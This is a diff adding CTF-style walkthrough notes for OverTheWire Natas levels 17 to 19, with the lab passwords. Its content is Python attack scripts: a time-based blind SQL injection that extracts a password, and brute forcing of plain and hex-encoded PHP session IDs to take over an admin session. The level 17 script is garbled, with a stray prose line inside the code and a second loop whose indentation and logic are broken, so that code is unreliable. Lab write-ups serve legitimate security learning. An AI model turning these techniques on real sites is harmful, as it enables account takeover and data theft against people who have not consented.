@@ -158,3 +158,86 @@
             break
   ```
   * Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq 
+
+* level 17
+  * create a python script
+  ```py
+  import requests
+  import sys
+  from string import digits, ascii_lowercase, ascii_uppercase
+  charset = ascii_lowercase + ascii_uppercase + digits
+  sqli_1 = 'natas18" AND password LIKE BINARY "'
+  sqli_2 = '" AND SLEEP(5)-- '
+  
+  s = requests.Session()
+  s.auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
+  password = ""
+  # We assume that the password is 32 chars 
+  while len(password) < 32:
+    for char in charset:
+        try:
+            payload = {'username':sqli_1 + password + char + "%" + sqli_2}
+            r = s.post('http://natas17.natas.labs.overthewire.org/', data=payload, timeout=1)
+        except requests.Timeout:
+            sys.stdout.write(char)
+            sys.stdout.flush()
+            password += char
+            break
+  r.elapsed.total_seconds() gives exact time limit
+  while len(password) < 32:
+    for char in charset:
+            payload = {'username':sqli_1 + password + char + "%" + sqli_2}
+            r = s.post('http://natas17.natas.labs.overthewire.org/', data=payload, timeout=1)
+    if(r.elapsed.total_seconds()>5):
+    password += char
+    break
+    ```
+  * Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP   
+  
+* level 18
+  * create a python script
+  ```py
+  import requests
+  url = "http://natas18.natas.labs.overthewire.org"
+  url2 = "http://natas18.natas.labs.overthewire.org/index.php"
+  
+  s = requests.Session()
+  s.auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
+  r = s.get(url)
+  for x in range(640):
+    cookies = dict(PHPSESSID=str(x))
+    r = s.get(url2, cookies=cookies)
+    if "Login as an admin to retrieve" in r.text:
+        pass
+    else:
+        print(r.text)
+        break
+        ```
+ * Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+ 
+* level 19
+  * create a python script
+  ```py
+  import requests 
+  import binascii
+  url = "http://natas19.natas.labs.overthewire.org"
+  s = requests.Session()
+  s.auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
+  
+  for x in range(1000):
+    tmp = str(x) + "-admin"
+    val = binascii.hexlify(tmp.encode('utf-8'))
+
+    cookies = dict(PHPSESSID=val.decode('ascii'))
+    r = s.get(url, cookies=cookies)
+    if "Login as an admin to retrieve" in r.text:
+        pass
+    else:
+        print(r.text)
+        break
+        ```
+ * Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+
+* level 20
+
+ 
